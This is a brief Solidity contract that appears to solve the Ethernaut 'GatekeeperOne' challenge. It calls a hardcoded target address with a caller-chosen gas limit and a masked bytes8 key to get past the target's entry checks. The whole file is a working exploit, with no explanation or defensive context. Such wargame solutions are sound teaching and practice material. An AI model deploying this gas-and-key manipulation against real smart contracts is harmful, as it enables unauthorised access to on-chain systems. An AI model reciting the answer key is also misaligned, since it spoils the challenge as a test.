pragma solidity 0.6.11;

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperOne {
    address gate = 0x6C1d501d866d9545fc7dFB6d3a641e24F38a7047;
    bytes8 key = bytes8(0xF597969Ce82198Af) & 0xFFFFFFFF0000FFFF;
    

    function exec(uint256 g) public {
        gate.call.gas(g)(abi.encodeWithSignature("enter(bytes8)", key));
    }
}